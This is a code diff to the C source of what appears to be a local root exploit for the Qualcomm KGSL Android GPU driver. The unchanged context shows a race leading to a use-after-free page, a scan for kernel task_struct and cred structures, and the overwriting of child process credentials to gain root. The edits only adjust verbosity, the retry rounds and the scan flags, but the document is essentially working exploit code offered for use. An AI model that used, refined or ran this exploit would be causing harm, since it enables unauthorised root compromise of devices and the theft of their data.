@@ -143,6 +143,7 @@ static void *g_pressure_map;
 static size_t g_pressure_size;
 static volatile int race_go;
 static int verbose = 1;
+static int verbose_detail;
 static const struct target_profile *g_target;
 #define SEC_LOG_SIZE (64 * 1024)
 static char *g_sec_log;
@@ -693,9 +694,10 @@ static int race_once(int *out_fd, uint64_t *uaf_page) {
         *uaf_page = uaf_gpu;
         return 0;
     }
-    printf("[-] race lost (mmap=%p errno=%d racer ret=%d errno=%d)\n",
-           overlap_vma, mmap_err,
-           created ? ra[0].ret : -1, created ? ra[0].err : 0);
+    if (verbose_detail)
+        printf("[-] race lost (mmap=%p errno=%d racer ret=%d errno=%d)\n",
+               overlap_vma, mmap_err,
+               created ? ra[0].ret : -1, created ? ra[0].err : 0);
 fail:
     if (overlap_vma && overlap_vma != MAP_FAILED) munmap(overlap_vma, overlap_mmap_size);
     if (ph_vma) munmap(ph_vma, ph_mmap_size);
@@ -1789,9 +1791,10 @@ static int find_task_candidates(
                     .idx = idx,
                 };
                 (*candidate_count)++;
-                printf("[+] task base=%llx pid=%d cred=%llx idx=%d\n",
-                       (unsigned long long)base, pid,
-                       (unsigned long long)cred, idx);
+                if (verbose_detail)
+                    printf("[+] task base=%llx pid=%d cred=%llx idx=%d\n",
+                           (unsigned long long)base, pid,
+                           (unsigned long long)cred, idx);
                 if (*candidate_count == candidate_capacity) {
                     printf("[+] collected %zu writable child task_structs\n",
                            *candidate_count);
@@ -2035,9 +2038,11 @@ static int patch_any_child_credential(
         }
         if (duplicate_offset) continue;
         scanned_cred_offsets[scanned_cred_offset_count++] = cred_offset;
-        printf("[*] scanning credential aliases at page offset=%03llx from pid=%d\n",
-               (unsigned long long)cred_offset,
-               (int)task_candidates[anchor].pid);
+        if (verbose_detail || anchor == 0)
+            printf("[*] scanning credential aliases at page offset=%03llx"
+                   " from pid=%d\n",
+                   (unsigned long long)cred_offset,
+                   (int)task_candidates[anchor].pid);
 
         struct cred_alias_candidate *cred_candidates = NULL;
         size_t cred_candidate_count = 0;
@@ -2053,8 +2058,9 @@ static int patch_any_child_credential(
         }
 
         for (size_t i = 0; i < cred_candidate_count; i++) {
-            printf("[*] checking credential alias %zu/%zu\n",
-                   i + 1, cred_candidate_count);
+            if (verbose_detail)
+                printf("[*] checking credential alias %zu/%zu\n",
+                       i + 1, cred_candidate_count);
             if (patch_credential_alias(
                     fd, ctx, ib_id, ib_gpu, ib_vma,
                     dump_id, dump_gpu, dump_vma,
@@ -2422,6 +2428,7 @@ int main(int argc, char **argv) {
     setvbuf(stdout, NULL, _IONBF, 0);
     setvbuf(stderr, NULL, _IONBF, 0);
     g_start_ms = now_ms();
+    verbose_detail = env_flag("KGSL_VERBOSE", 0);
 
     g_target = target_profile_get();
     if (!g_target) {
@@ -2541,7 +2548,7 @@ int main(int argc, char **argv) {
         return 1;
     }
 
-    long rounds = 8;
+    long rounds = 3;
     env_status = read_env_long("KGSL_ROUNDS", 1, 16, &rounds);
     if (env_status < 0) {
         fprintf(stderr, "[-] KGSL_ROUNDS must be between 1 and 16\n");
@@ -2631,9 +2638,9 @@ int main(int argc, char **argv) {
                 dump_id, dump_gpu, dump_vma, uaf_gpu, g_target,
                 task_candidates, MAX_TASK_CANDIDATES,
                 &task_candidate_count, 0);
-        if (found < 0 && !getenv("KGSL_SCAN_FULL")) {
+        if (found < 0 && getenv("KGSL_SCAN_ALL")) {
             fprintf(stderr,
-                    "[*] fast scan found nothing; retrying with full scan\n");
+                    "[*] fast scan found nothing; full scan (KGSL_SCAN_ALL)\n");
             task_candidate_count = 0;
             found = find_task_candidates(
                     fd, ctx, ib_id, ib_gpu, ib_vma, IB_SIZE,
@@ -2642,7 +2649,8 @@ int main(int argc, char **argv) {
                     &task_candidate_count, 1);
         }
         if (found < 0) {
-            fprintf(stderr, "[-] task_struct not found\n");
+            fprintf(stderr, "[-] task_struct not found (fast scan; set"
+                            " KGSL_SCAN_ALL=1 for the full scan)\n");
             abandon_round(&fd, &ib_id, &ib_vma, &dump_id, &dump_vma);
             continue;
         }
@@ -2661,7 +2669,9 @@ int main(int argc, char **argv) {
         root_verified = 1;
     }
     if (!root_verified) {
-        fprintf(stderr, "[-] root child not found after %ld rounds\n", rounds);
+        fprintf(stderr, "[-] root child not found after %ld round(s): KGSL"
+                        " pool/race looks exhausted, reboot and retry\n",
+                rounds);
         kill_children_except(-1);
         return 1;
     }
